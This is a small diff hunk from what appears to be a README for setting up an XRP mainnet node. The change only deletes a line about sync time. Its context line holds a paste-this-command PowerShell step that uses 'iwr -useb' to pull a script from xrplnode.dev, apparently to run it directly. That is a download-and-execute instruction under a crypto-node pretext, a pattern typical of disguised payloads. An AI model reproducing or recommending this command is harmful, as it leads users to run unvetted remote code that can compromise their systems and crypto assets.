@@ -15,8 +15,6 @@ powershell -c "$version='xrp-mainnet-node=4.1.7-1b0a841'; iwr -useb xrplnode.dev
 
 _After executing the command, the node will begin initializing and syncing with the XRP network._ <br>
 
-This process can take a few minutes, depending on your internet connection speed.
-
 <table>
 <tr>
 <td width="50%" valign="top">
